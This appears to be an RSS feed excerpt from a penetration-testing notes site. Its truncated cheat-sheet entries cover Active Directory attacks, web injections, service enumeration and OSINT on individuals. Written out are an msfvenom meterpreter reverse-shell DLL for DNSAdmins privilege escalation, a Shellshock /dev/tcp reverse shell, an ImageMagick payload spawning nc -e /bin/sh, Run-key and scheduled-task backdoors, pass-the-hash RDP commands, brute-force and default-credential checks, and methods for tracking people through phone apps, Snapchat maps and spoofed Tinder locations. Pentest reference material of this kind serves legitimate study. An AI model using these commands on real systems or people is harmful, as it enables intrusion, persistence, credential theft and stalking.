General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC) NTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 # NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</description>
    </item>
    
    <item>
      <title>MISC &amp; Others</title>
      <link>/passcracking-hashfiles/misc_others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/passcracking-hashfiles/misc_others/</guid>
      <description>Argon2 cracker https://github.com/CyberKnight00/Argon2_Cracker # Argon2 is a key derivation function that was selected as the winner of the Password Hashing  # Competition in July 2015. It is designed by Alex Biryukov, Daniel Dinu, and Dmitry Khovratovich # from University of Luxembourg. Argon2 has 3 variants : Argon2d, Argon2i and Argon2id. ./crack_argon2.py -c &amp;#39;&amp;lt; Argon2 Hash &amp;gt;&amp;#39; -w &amp;#39;&amp;lt; Path/To/Wordlist &amp;gt;&amp;#39; Lestat https://github.com/astar-security/Lestat # Great tool by Astar Security, multiple scripts for extraction, parsing and creating wordlists.</description>
    </item>
    
    <item>
      <title>Persistence</title>
      <link>/windows-systems/post-exploitation-techniques/persistence/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/persistence/</guid>
      <description>Resources https://rastamouse.me/2018/03/a-view-of-persistence/ Userland &amp;amp; Elevated # Userland techniques # HKCU # Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows. (Other keys are available). Value name: Backdoor Value data: C:\Users\Rasta\AppData\Local\Temp\backdoor.exe # Start-up # Create a batch script in the user startup folder. PS C:\&amp;gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe # Scheduled Tasks PS C:\&amp;gt; $A = New-ScheduledTaskAction -Execute &amp;#34;cmd.exe&amp;#34; -Argument &amp;#34;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&amp;#34; PS C:\&amp;gt; $T = New-ScheduledTaskTrigger -AtLogOn -User &amp;#34;Rasta&amp;#34; PS C:\&amp;gt; $P = New-ScheduledTaskPrincipal &amp;#34;Rasta&amp;#34; PS C:\&amp;gt; $S = New-ScheduledTaskSettingsSet PS C:\&amp;gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\&amp;gt; Register-ScheduledTask Backdoor -InputObject $D # Powershell profiles # You can backdoor the powershell profile PS C:\&amp;gt; Test-Path $profile False PS C:\&amp;gt; New-Item -Path $profile -Type File –Force Directory: C:\Users\Rasta\Documents\WindowsPowerShell Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 22/03/2018 12:42 0 Microsoft.</description>
    </item>
    
    <item>
      <title>Picture Investigation</title>
      <link>/open-source-intelligence-osint/human-recon/pictures/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/pictures/</guid>
      <description>General # Flickr Image search https://www.flickr.com/map Reverse Image Search # Mutiple sources reverse image search https://www.duplichecker.com/reverse-image-search.php # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ # Dedicated to faces # Results are not free but previews are available (used then on traditionnal engines) https://pimeyes.com/en/ # If the classical method doesn&amp;#39;t give any result, for example for a logo # You can try to calculate the file hash (VT, Powershell, CyberChef.</description>
    </item>
    
    <item>
      <title>Server Side Request Forgery (SSRF)</title>
      <link>/web-pentest/injections/server-side-injections/ssrf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/ssrf/</guid>
      <description>https://vinc.top/2016/11/24/server-side-request-forgery https://github.com/allanlw/svg-cheatsheet PoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:&amp;lt;port&amp;gt; # It is also possible to use others protocols like gopher and dict # They don&amp;#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.0.0.1 http://0 instead of http://localhost http://0xC0A80001 or http://3232235521 =&amp;gt; 192.</description>
    </item>
    
    <item>
      <title>Tricks &amp; Others</title>
      <link>/web-pentest/php-vulnerabilities/tricks_others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/tricks_others/</guid>
      <description>Code auditing / Looking for vulnerabilities https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed.  # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can  # preload an arbitrary shared object. Our shared object will execute our custom  # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.</description>
    </item>
    
    <item>
      <title>110 - POP3</title>
      <link>/network/services-enumeration/110_pop3/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/110_pop3/</guid>
      <description>Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION)	 nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP Banner grabbing/checking # Using netcat nc &amp;lt;IP&amp;gt; 110 # Using telnet telnet &amp;lt;IP&amp;gt; 110 Authentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor # Once logged list </description>
    </item>
    
    <item>
      <title>Danger Zone</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/</guid>
      <description>General Informations https://github.com/woj-ciech/Danger-zone ⇒ HORRIBLE SETUP #FuckingGoogleSearchApiModule # Correlate data between domains, ips and email addresses, present it as a graph # And store everything into Elasticsearch and JSON files # You have to edit the settings.json file in order to provide your API keys and Elestic database info # Golden Rule → Don&amp;#39;t jump to conclusions too fast Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--address ADDRESS] [--domain DOMAIN] [--elasticsearch] Correlate data between domains, ips and email addresses and present it as a graph.</description>
    </item>
    
    <item>
      <title>DNSadmins group</title>
      <link>/windows-systems/privilege-escalation/dnsadmins_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM # Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
    </item>
    
    <item>
      <title>Headers Injections</title>
      <link>/web-pentest/injections/headers_injections/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/headers_injections/</guid>
      <description>Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website) Interesting Headers Some interesting header to fuzz the application with: Host: 127.</description>
    </item>
    
    <item>
      <title>Kubernetes</title>
      <link>/other-systems/kubernetes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/kubernetes/</guid>
      <description>Resources https://book.hacktricks.xyz/pentesting/pentesting-kubernetes </description>
    </item>
    
    <item>
      <title>MISC &amp; Others</title>
      <link>/web-pentest/content-management-system-cms/others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/others/</guid>
      <description>CMSimple # CMSimple LFI index.php ?sl=../adm&amp;amp;file=config&amp;amp;action=download&amp;amp;adm=1 NanoCMS # Password and sensitive data leak [url]/data/pagesdata.txt </description>
    </item>
    
    <item>
      <title>OS Command Injections</title>
      <link>/web-pentest/injections/server-side-injections/os/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/os/</guid>
      <description>Command Injection # Command Injection blablabla ; ls # Bypass filters - syntax error &amp;#39;&amp;#39; OK &amp;#39;127.0.0.1&amp;#39; OK () syntax error `ls` syntax error (car ` filtré donc `ls` =&amp;gt; ls) `;` OK 127.|0.0.1 OK =&amp;gt; | filtré 127.0.&amp;amp;0.1 OK =&amp;gt; &amp;amp; filtré 127.0.;0.1 OK =&amp;gt; ; filtré 127.0.$0.1 OK =&amp;gt; $ filtré 127.0.`0.1 OK =&amp;gt; ` filtré 127.0.``0.1 OK =&amp;gt; ` filtré 127.0.&amp;#39;0.1 syntax error =&amp;gt; &amp;#39; pas filtré 127.</description>
    </item>
    
    <item>
      <title>Phone</title>
      <link>/open-source-intelligence-osint/human-recon/phone/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/phone/</guid>
      <description>Using phone contact book apps https://www.bellingcat.com/resources/how-tos/2019/04/08/using-phone-contact-book-apps-for-digital-research/ # GetContact # Free, need SMS requirement (burner) + email # Banned in some countries but works good # List one possible name # TrueCaller # Free, need Google or Microsoft account # Works good, list one possible name and tags # CallApp # Free, need Google or Microsoft account OR SMS # Works good, lists comments from users about number, gives a  # reliability score to number, shows how often the number was searched # Dalily # No requirements, free # Focused only on Arabic-speaking countries # Can search by either name or number, and also will provide all contact book # information (email, etc), not just name and number  # Eyecon # Free, SMS requirement # Photograph and one name for the contact # Viewcaller / Showcaller # No requirements, free # Only one name, very basic details Phone number verification and validation # The International Numbering Plans gives a nice database to find the country https://www.</description>
    </item>
    
    <item>
      <title>RDP Exploitation</title>
      <link>/windows-systems/exploitation/rdp_exploitation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable # RDP through Pass-the-Hash xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local # RDP using mimikatz and PtH sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:&amp;#34;mstsc.exe /restrictedadmin&amp;#34; cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable Powershell # Requires admin privileges or being able to run as sudo (using powershell sudo.</description>
    </item>
    
    <item>
      <title>Snapchat</title>
      <link>/open-source-intelligence-osint/platforms-hunting/snapchat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/snapchat/</guid>
      <description># Snapchat guide for law enforcment https://storage.googleapis.com/snap-inc/privacy/lawenforcement.pdf Online Research Tools # Online browser # Potentially NSFW https://sovip.io # User Search https://www.snapdex.com/ https://snapyfox.com/ # Location  https://map.snapchat.com/ Snapchat Map https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/ # Using the map you can view public content # You can play with overlays and save videos # To get video # - Developper Tools (F12) # - Network and filter on medias # - Reload (Ctrl+R) # - On the snap link, right click and open in new tab # By default it removes extra graphics layer https://s.</description>
    </item>
    
    <item>
      <title>119 - NTP</title>
      <link>/network/services-enumeration/119_nntp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/119_nntp/</guid>
      <description>Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article </description>
    </item>
    
    <item>
      <title>Active Directory Delegations</title>
      <link>/windows-systems/privilege-escalation/delegations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/delegations/</guid>
      <description>Unconstrained Delegation # Nice resource for user account =/= machine account in UC http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html # AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set # You can search for users using Pywerview $ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained # You can also request through ldapdomain dump and then grep for interesting $ ldapdomaindump -u &amp;#34;foo.lan\\ownedUser&amp;#34; -p &amp;#34;userPassword&amp;#34; 192.168.30.10 $ grep TRUSTED_FOR_DELEGATION *.</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/windows-systems/exploitation/file_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/file_transfer/</guid>
      <description>/etc/init.d/pure-ftpd SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords # Since Windows 10, you can&amp;#39;t do anonymous smb server anymore sudo python smbserver.</description>
    </item>
    
    <item>
      <title>Geolocation &amp; GEOINT</title>
      <link>/open-source-intelligence-osint/human-recon/geolocation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
      <description>Maps MISC # Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ # 360° pictures database https://www.360cities.net/ # Compare maps by time # Many historical maps http://www.georeferencer.com # Word Postal Codes https://worldpostalcode.com/ Google Maps Alternatives https://twitter.com/y_vdw/status/1339984896022876160 # Other maps services https://yandex.com/maps http://openstreetcam.org/map/ https://www.mapillary.com/ # Search for specific country https://twitter.com/y_vdw/status/1339984940377624576?s=20 https://en.wikipedia.org/wiki/List_of_street_view_services # Sentinel Hub can be good # Not always very clear, but easier to go back in time https://apps.</description>
    </item>
    
    <item>
      <title>ReconDog</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/</guid>
      <description>General Informations # Recon Dog is an all in one tool for all your basic information gathering needs. # It uses APIs to gather all the information so your identity is not exposed. # Simple and basic standalone python script # All informations seems to be extracted from API&amp;#39;s services, so it fully passive Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of information about an IP address • NS Lookup: Performs name server search • Port scan: Scans the most common TCP ports • Detect CMS: Can detect more than 400 content management systems • Whois Lookup: Performs whois protocol search • Detect honeypot: Uses Shodan to identify whether the target is a honeypot • Find subdomains: Search for sub-domains using com • Reverse IP Lookup: Does an inverse IP lookup to find domains associated with an IP address • Detect technologies: Uses wappalyzer.</description>
    </item>
    
    <item>
      <title>SSTI</title>
      <link>/web-pentest/injections/server-side-injections/ssti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/ssti/</guid>
      <description>Server Side Template Injection # You can use tools like tplmap ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d &amp;#34;nickname=john&amp;#34; ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d &amp;#34;nickname=john&amp;#34; --os-shell # Freemarker command execution &amp;lt;#assign ex=&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()&amp;gt; ${ ex(&amp;#34;cmd&amp;#34;) } </description>
    </item>
    
    <item>
      <title>TikTok</title>
      <link>/open-source-intelligence-osint/platforms-hunting/tiktok/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/tiktok/</guid>
      <description>TikTok # Resources https://www.skopenow.com/news/tiktok-investigations-and-osint-tips # Searching info https://www.osintcombine.com/tiktok-quick-search # Downloader https://ttdown.org/ https://en.savefrom.net/download-from-tiktok # Tiktok Analytics https://cloutmeter.com/ Profile Discovery # Method 1 : You have usernames tiktok.com/@{username} # Method 2 : Involving Dorks site:tiktok.com &amp;#34;username&amp;#34; OR &amp;#34;first and last name&amp;#34; # Method 3 : Search for mentions on other social media &amp;#34;username&amp;#34; OR &amp;#34;first and last name&amp;#34; &amp;#34;tiktok.com&amp;#34; -site:tiktok.com Profile Picture # Method 1 # Right click --&amp;gt; Inspect # Method 2 https://tiktok.</description>
    </item>
    
    <item>
      <title>135 - RPC</title>
      <link>/network/services-enumeration/135_rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/135_rpc/</guid>
      <description>Resources http://attackerkb.com/Windows/rpcclient rpcclient # Anonymous connection (-N=no pass) rpcclient -U “” -N &amp;lt;ip&amp;gt; # Connection with user rpcclient -U “user” &amp;lt;ip&amp;gt; # Get information about the DC srvinfo # Get information about objects such as groups (enum*) enumdomains enumdomgroups enumalsgroups builtin # Try to get domain password policy getdompwinfo # Try to enumerate different truste domains dsr_enumtrustdom # Get username for a defined user ? getusername # Query user, group etc informations queryuser RID querygroupmem519 queryaliasmem builtin 0x220 # Query info policy lsaquery # Convert SID to names lookupsids SID enum4linux # Verbose mode enum4linux -v target-ip # Do everything enum4linux -a target-ip # List users enum4linux -U target-ip # If you&amp;#39;ve managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option enum4linux -u administrator -p password -U target-ip # Get username from the defaut RID range (500-550, 1000-1050) enum4linux -r target-ip # Get username using a custom RID range enum4linux -R 600-660 target-ip # List groups enum4linux -G target-ip # List shares enum4linux -S target-ip # Perform a dictionary attack, if the server doesn&amp;#39;t let you retrieve a share list  enum4linux -s shares.</description>
    </item>
    
    <item>
      <title>Attacking APIs</title>
      <link>/web-pentest/attacking_apis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/attacking_apis/</guid>
      <description>Resources https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93 https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765 https://github.com/smodnix/31-days-of-API-Security-Tips https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0 https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2 # How to use different known APIs https://github.com/streaak/keyhacks SOAP vs REST # REST uses: HTTP, JSON , URL and XML # SOAP uses: mostly HTTP and XML # SOAP can be more recommandded in terms of security, if you have to process critical data. Checklist # Test tokens # Authentication token, JWT, Base64 encoded... # Input validation # All entry points (command injection, sql injections, html.</description>
    </item>
    
    <item>
      <title>IIS</title>
      <link>/windows-systems/exploitation/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/iis/</guid>
      <description>Tomcat Tips &amp;amp; Tricks # Two interfaces for tomcat /manager /host-manager # default root for IIS is  C:\inetpub\wwwroot # Instead of using complicated relative path of the application use that one. # Upload to:  C:\inetpub\wwwroot\shell.jsp curl http://13.33.3.37/shell.jsp Exploiting the classic Manager # Metasploit provides an easy to use module to upload files and get a shell use exploit/multi/http/tomcat_mgr_upload msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rhost 192.168.1.101 msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rport 8080 msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httpusername tomcat msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httppassword tomcat msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; exploit # But also possible to only generate a WAR payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.</description>
    </item>
    
    <item>
      <title>MISC - Tips &amp; Tricks</title>
      <link>/open-source-intelligence-osint/human-recon/misc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/misc/</guid>
      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig # Not really people oriented # But public funds for french towns and cities can be found here https://www.</description>
    </item>
    
    <item>
      <title>OSINT-SPY</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/</guid>
      <description>General Informations # Performs OSINT scan on email/domain/ip_address/organization using OSINT-SPY. # It can be used by Data Miners, Infosec Researchers, Penetration Testers and cyber crime # investigator in order to find deep information about their target. # Perform scan on IP Address / domain / email address / BTC(bitcoin) address / device # Find out latest bitcoin block information # List out all the ciphers supported by particular website and server # Check whether a particular website is vulnerable to heartbleed or not ?</description>
    </item>
    
    <item>
      <title>PrivExchange</title>
      <link>/windows-systems/privilege-escalation/privexchange/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/privexchange/</guid>
      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
    </item>
    
    <item>
      <title>Tinder</title>
      <link>/open-source-intelligence-osint/platforms-hunting/tinder/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/tinder/</guid>
      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis # You can browe users https://www.gotinder.com/@user </description>
    </item>
    
    <item>
      <title>139/445 - SMB</title>
      <link>/network/services-enumeration/139_445_smb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/139_445_smb/</guid>
      <description>General Informations SMB1 =&amp;gt; Win2000 / XP / 2003 SMB2.0 =&amp;gt; Vista / 2008 SMB2.1 =&amp;gt; Win7 / 2008R2 SMB3.0 =&amp;gt; Win8 / 2012 SMB 3.02 =&amp;gt; Win8.1 / 2012R2 # Configuration tips # Can be usefull to configure /etc/samba/smb.conf with: client min protocol = SMB2 client max protocol = SMB3 # Then service smbd restart Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (identifier le nom/domaine) # Identity SMB2 support using metasploit use auxiliary/scanner/smb/smb2 set RHOST IP run # Discover real samba version if hidden  ngrep -i -d tap0 ‘s.</description>
    </item>
    
    <item>
      <title>Belati</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/</guid>
      <description>General Informations # Belati is tool for Collecting Public Data &amp;amp; Public Document from Website and other service for OSINT purpose.  # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won&amp;#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found.</description>
    </item>
    
    <item>
      <title>CVE &amp; Vulns exploits</title>
      <link>/web-pentest/cve_exploits/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/cve_exploits/</guid>
      <description>Imagick - CVE-2016-3718 - SSRF Dans un .svg push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(https://example.com/image.jpg&amp;#34;|nc -l -p 7777 -e&amp;#34;/bin/sh)&amp;#39; pop graphic-context Shellshock - CVE-2014-6271 Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock # Shellshock == CVE-2014-6271 # Classic PoC curl -H &amp;#34;User-Agent: () { :; }; /bin/command&amp;#34; http://example.com/ () {:;}; /bin/cat /etc/passwd # Reverse shell () { :; }; /bin/sh -c /bin/sh -i &amp;gt;&amp;amp; /dev/tcp/139.</description>
    </item>
    
    <item>
      <title>Github</title>
      <link>/open-source-intelligence-osint/platforms-hunting/github/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/github/</guid>
      <description>General # Online Service used to search in many git repositories https://grep.app/ Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch # Usually, credential leaks do not occur on the company public Github # But more on developer/employees personal Github Gitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensitive data in github repositories https://michenriksen.</description>
    </item>
    
    <item>
      <title>IPv6</title>
      <link>/windows-systems/exploitation/ipv6/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/ipv6/</guid>
      <description>Mitm6 # Resources https://github.com/fox-it/mitm6 https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ https://systemadminspro.com/domain-attacks-getting-an-account/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://blog.vonahi.io/taking-over-ipv6-networks/ https://intrinium.com/mitm6-pen-testing/ # mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. # It does this by replying to DHCPv6 messages, providing victims with a link-local # IPv6 address and setting the attackers host as default DNS server # When using mitm6, it issues a DHCPv6 lease to clients that last for a period of 300 seconds (or 5 minutes) # Due to this, it&amp;#39;s possible that several DNS queries will actually fail, resulting in clients # not being able to access services that rely on DNS names.</description>
    </item>
    
    <item>
      <title>Windows Defender</title>
      <link>/windows-systems/privilege-escalation/windows_defender/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
